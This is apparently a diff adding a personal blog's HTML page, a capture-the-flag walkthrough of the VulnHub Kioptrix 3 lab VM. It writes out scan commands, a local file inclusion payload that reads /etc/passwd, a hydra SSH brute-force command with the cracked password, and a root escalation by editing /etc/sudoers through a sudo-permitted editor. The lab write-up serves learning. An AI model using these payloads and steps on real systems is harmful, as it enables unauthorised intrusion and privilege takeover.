@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en-us" data-theme="light"><head>
+    <title> Somesh Bhandarkar | Kioptrix 3 </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.70.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Graduate Candidate in Cybersecurity at the University of Maryland, College Park">
+    
+    <link rel="stylesheet" href="https://somesh-bhandarkar.github.io/css/style.min.67cd718c0a3c8009c771494d381fb7128246a454bd0518fed97cb65d257db948.css" integrity="sha256-Z81xjAo8gAnHcUlNOB&#43;3EoJGpFS9BRj&#43;2Xy2XSV9uUg=" crossorigin="anonymous" type="text/css">
+    
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="shortcut icon" href="https://somesh-bhandarkar.github.io/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://somesh-bhandarkar.github.io/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://somesh-bhandarkar.github.io/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://somesh-bhandarkar.github.io/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://somesh-bhandarkar.github.io/post/kioptrix-3/">
+    
+    
+    <script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM=" crossorigin="anonymous"></script>
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://somesh-bhandarkar.github.io/img/prof.jpeg" alt="profile picture">
+        <h3 title=""><a href="/">I&#39;m Somesh Bhandarkar</a></h3>
+        <div class="description">
+          <p>Graduate Candidate in Cybersecurity at the University of Maryland, College Park</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://linkedin.com/linkedin.com/in/somesh-bhandarkar" rel="me" aria-label="Linkedin">
+          <i class="fa fa-2x fa-linkedin" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://github.com/somesh-bhandarkar" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://www.instagram.com/" rel="me" aria-label="instagram">
+          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="bsomesh98@gmail.com" rel="me" aria-label="e-mail">
+          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; Somesh Bhandarkar 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <ul class="nav">
+        
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+        
+        
+        <li><a  href="/post/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/about/" title="">About</a></li>
+        
+    </ul>
+    <div class="themeswitcher">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+        </a>
+    </div>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Kioptrix 3
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i><span class="date">Mon, Jun 1, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">8-minute read</span>
+        </div>
+        
+        </div>
+
+    <h1 id="kioptrix3">Kioptrix3</h1>
+<p>URL: <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">Nmap</h3>
+<h4 id="command-used">Command Used</h4>
+<blockquote>
+<p>nmap -sC -sV -A -O 192.168.48.137</p>
+</blockquote>
+<h4 id="result">Result</h4>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-09 23:00 EST
+Nmap scan report for 192.168.48.137
+Host is up (0.0011s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+MAC Address: 00:0C:29:EF:AE:DE (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.11 ms 192.168.48.137
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
+</code></pre><p>Here we see that only SSH and HTTP ports are open, cannot attack the SSH port unless we know a valid username to bruteforce.</p>
+<p>Hence we enumerate port 80</p>
+<h3 id="nikto">Nikto</h3>
+<h4 id="command-used-1">Command Used</h4>
+<blockquote>
+<p>nikto -host 192.168.48.137</p>
+</blockquote>
+<pre><code>- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.48.137
++ Target Hostname:    192.168.48.137
++ Target Port:        80
++ Start Time:         2019-11-09 23:04:29 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
++ Cookie PHPSESSID created without the httponly flag
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
++ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 7914 requests: 0 error(s) and 19 item(s) reported on remote host
++ End Time:           2019-11-09 23:04:59 (GMT-5) (30 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre><p>We see that the web interface has phpmyadmin directory.
+<img src="/img/vulnhub/kioptrix-3/myadmin1.png" alt="php-my-admin"></p>
+<p>Trying out default credentials, Username = admin and empty password. It works.
+<img src="/img/vulnhub/kioptrix-3/myadmin2.png" alt="php-my-admin-login">
+But we see that, admin has access to only information_schema.
+No user information is given that can be used.</p>
+<p>The website has two major components,</p>
+<ul>
+<li>Blog: <a href="http://kioptrix3.com/index.php?system=Blog">http://kioptrix3.com/index.php?system=Blog</a></li>
+<li>gallery: <a href="http://kioptrix3.com/gallery/">http://kioptrix3.com/gallery/</a></li>
+</ul>
+<p>In the blog on the second post we can a username on the second blogpost</p>
+<blockquote>
+<p>Welcome loneferret! and don&rsquo;t forget to fill in your time sheet.</p>
+</blockquote>
+<p>We check the existance of loneferret using File Inclusion Vulnerability. <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">OWASP</a>
+In the URL include</p>
+<blockquote>
+<p>http://192.168.48.137/index.php?system=../../../../../etc/passwd%00jpg</p>
+</blockquote>
+<p>This gives output</p>
+<pre><code>root❌0:0:root:/root:/bin/bash  
+daemon❌1:1:daemon:/usr/sbin:/bin/sh  
+bin❌2:2:bin:/bin:/bin/sh  
+sys❌3:3:sys:/dev:/bin/sh  
+sync❌4:65534:sync:/bin:/bin/sync  
+games❌5:60:games:/usr/games:/bin/sh  
+man❌6:12:man:/var/cache/man:/bin/sh  
+lp❌7:7:lp:/var/spool/lpd:/bin/sh  
+mail❌8:8:mail:/var/mail:/bin/sh  
+news❌9:9:news:/var/spool/news:/bin/sh  
+uucp❌10:10:uucp:/var/spool/uucp:/bin/sh  
+proxy❌13:13:proxy:/bin:/bin/sh  
+www-data❌33:33:www-data:/var/www:/bin/sh  
+backup❌34:34:backup:/var/backups:/bin/sh  
+list❌38:38:Mailing List Manager:/var/list:/bin/sh  
+irc❌39:39:ircd:/var/run/ircd:/bin/sh  
+gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  
+nobody❌65534:65534:nobody:/nonexistent:/bin/sh  
+libuuid❌100:101::/var/lib/libuuid:/bin/sh  
+dhcp❌101:102::/nonexistent:/bin/false  
+syslog❌102:103::/home/syslog:/bin/false  
+klog❌103:104::/home/klog:/bin/false  
+mysql❌104:108:MySQL Server,,,:/var/lib/mysql:/bin/false  
+sshd❌105:65534::/var/run/sshd:/usr/sbin/nologin  
+loneferret❌1000💯loneferret,,,:/home/loneferret:/bin/bash  
+dreg❌1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash  
+  
+Parse error: syntax error, unexpected '.', expecting T_STRING or T_VARIABLE or '$' in /home/www/kioptrix3.com/core/lib/router.php(26) : eval()'d code on line 1
+</code></pre><p>Now, we have a user that we can bruteforce.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="hydra">Hydra</h3>
+<p>I used hydra and <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials">the wordlist</a> to ssh into the system. Use -t 4 parameter which means tasks runnning in parallel, or else the load will be too much.</p>
+<h4 id="command-used-2">Command Used</h4>
+<blockquote>
+<p>hydra -e nsr -l loneferret -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt 192.168.48.137 ssh -t 4</p>
+</blockquote>
+<pre><code>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-09 23:55:33
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 100003 login tries (l:1/p:100003), ~25001 tries per task
+[DATA] attacking ssh://192.168.48.137:22/
+[STATUS] 52.00 tries/min, 52 tries in 00:01h, 99951 to do in 32:03h, 4 active
+[22][ssh] host: 192.168.48.137   login: **loneferret**   password: **starwars**
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-11-09 23:57:09
+</code></pre><p>We get the password for loneferret which is starwars.
+Eshtablishing the SSH connection</p>
+<pre><code>ssh loneferret@192.168.48.137
+loneferret@192.168.48.137's password: 
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
+
+loneferret@Kioptrix3:~$
+</code></pre><p>We get shell of user loneferret.</p>
+<h2 id="privilage-escalation">Privilage Escalation</h2>
+<p>Enumerating the files</p>
+<pre><code>loneferret@Kioptrix3:~$ ls -al
+total 64
+drwxr-xr-x 3 loneferret loneferret  4096 2011-04-17 08:59 .
+drwxr-xr-x 5 root       root        4096 2011-04-16 07:54 ..
+-rw-r--r-- 1 loneferret users         13 2011-04-18 11:44 .bash_history
+-rw-r--r-- 1 loneferret loneferret   220 2011-04-11 17:00 .bash_logout
+-rw-r--r-- 1 loneferret loneferret  2940 2011-04-11 17:00 .bashrc
+-rwxrwxr-x 1 root       root       26275 2011-01-12 10:45 checksec.sh
+-rw-r--r-- 1 root       root         224 2011-04-16 08:51 CompanyPolicy.README
+-rw------- 1 root       root          15 2011-04-15 21:21 .nano_history
+-rw-r--r-- 1 loneferret loneferret   586 2011-04-11 17:00 .profile
+drwx------ 2 loneferret loneferret  4096 2011-04-14 11:05 .ssh
+-rw-r--r-- 1 loneferret loneferret     0 2011-04-11 18:00 .sudo_as_admin_successful
+
+loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+</code></pre><p>We see the CompanyPolicy.README which gives further details of the system</p>
+<pre><code>loneferret@Kioptrix3:~$ ls -al
+total 64
+drwxr-xr-x 3 loneferret loneferret  4096 2011-04-17 08:59 .
+drwxr-xr-x 5 root       root        4096 2011-04-16 07:54 ..
+-rw-r--r-- 1 loneferret users         13 2011-04-18 11:44 .bash_history
+-rw-r--r-- 1 loneferret loneferret   220 2011-04-11 17:00 .bash_logout
+-rw-r--r-- 1 loneferret loneferret  2940 2011-04-11 17:00 .bashrc
+-rwxrwxr-x 1 root       root       26275 2011-01-12 10:45 checksec.sh
+-rw-r--r-- 1 root       root         224 2011-04-16 08:51 CompanyPolicy.README
+-rw------- 1 root       root          15 2011-04-15 21:21 .nano_history
+-rw-r--r-- 1 loneferret loneferret   586 2011-04-11 17:00 .profile
+drwx------ 2 loneferret loneferret  4096 2011-04-14 11:05 .ssh
+-rw-r--r-- 1 loneferret loneferret     0 2011-04-11 18:00 .sudo_as_admin_successful
+
+loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+
+loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command 'sudo ht'.
+Failure to do so will result in you immediate termination.
+
+DG
+CEO
+loneferret@Kioptrix3:~$ which ht
+/usr/local/bin/ht
+loneferret@Kioptrix3:~$ file /usr/local/bin/ht
+/usr/local/bin/ht: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.6.8, dynamically linked (uses shared libs), not stripped
+loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
+-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
+</code></pre><p>I had to read the <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post</a> to understand this.
+With the above enumeration we can see that the user localferret is not allowed to execute commands as /bin/su but allowed to execute command as /usr/local/bin/ht</p>
+<p>We can see that /usr/local/bin/ht file is an setuid file</p>
+<pre><code>loneferret@Kioptrix3:~$ sudo ht    
+Error opening terminal: xterm-256color.
+loneferret@Kioptrix3:~$ export TERM=xterm
+loneferret@Kioptrix3:~$ echo &quot;$TERM&quot;
+xterm
+loneferret@Kioptrix3:~$ sudo ht
+</code></pre><p>This gives</p>
+<p><img src="/img/vulnhub/kioptrix-3/htshell1.png" alt="sudo-ht"></p>
+<p>Using alt to navigate and opening the file /etc/sudoers</p>
+<p><img src="/img/vulnhub/kioptrix-3/htshell2.png" alt="/etc/sudoers"></p>
+<p>We see asection for privilage specification, all we have to do is grant root privilages to loneferret. We see the line</p>
+<blockquote>
+<p>loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht</p>
+</blockquote>
+<p>in this change <strong>!/usr/bin/su to /bin/su</strong> save and exit.</p>
+<p>run command</p>
+<blockquote>
+<p>sudo /bin/su</p>
+</blockquote>
+<pre><code>~:$ sudo /bin/su  
+root@Kioptrix3:/home/loneferret# whoami  
+root  
+</code></pre><p>We get root. Now to get the flag. &ldquo;cd&rdquo; into the root directory</p>
+<pre><code>/home/loneferret# cd /root  
+:~# ls -al  
+total 52  
+drwx------  5 root root  4096 2011-04-17 08:59 .  
+drwxr-xr-x 21 root root  4096 2011-04-11 16:54 ..  
+-rw-------  1 root root     9 2011-04-18 11:49 .bash_history  
+-rw-r--r--  1 root root  2227 2007-10-20 07:51 .bashrc  
+-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt  
+drwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18  
+-rw-------  1 root root   963 2011-04-12 19:33 .mysql_history  
+-rw-------  1 root root   228 2011-04-18 11:09 .nano_history  
+-rw-r--r--  1 root root   141 2007-10-20 07:51 .profile  
+drwx------  2 root root  4096 2011-04-13 10:06 .ssh  
+drwxr-xr-x  3 root root  4096 2011-04-15 23:30 .subversion  
+root@Kioptrix3:~# cat Congrats.txt   
+Good for you for getting here.  
+Regardless of the matter (staying within the spirit of the game of course)  
+you got here, congratulations are in order. Wasn't that bad now was it.  
+  
+Went in a different direction with this VM. Exploit based challenges are  
+nice. Helps workout that information gathering part, but sometimes we  
+need to get our hands dirty in other things as well.  
+Again, these VMs are beginner and not intented for everyone.   
+Difficulty is relative, keep that in mind.  
+  
+The object is to learn, do some research and have a little (legal)  
+fun in the process.  
+  
+  
+I hope you enjoyed this third challenge.  
+  
+Steven McElrea  
+aka loneferret  
+http://www.kioptrix.com  
+  
+  
+Credit needs to be given to the creators of the gallery webapp and CMS used  
+for the building of the Kioptrix VM3 site.  
+  
+Main page CMS:   
+http://www.lotuscms.org  
+  
+Gallery application:   
+Gallarific 2.1 - Free Version released October 10, 2009  
+http://www.gallarific.com  
+Vulnerable version of this application can be downloaded  
+from the Exploit-DB website:  
+http://www.exploit-db.com/exploits/15891/  
+  
+The HT Editor can be found here:  
+http://hte.sourceforge.net/downloads.html  
+And the vulnerable version on Exploit-DB here:  
+http://www.exploit-db.com/exploits/17083/  
+  
+  
+Also, all pictures were taken from Google Images, so being part of the  
+public domain I used them.  
+</code></pre><p>We get root and the flag.</p>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://somesh-bhandarkar.github.io/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>
+
+</html>
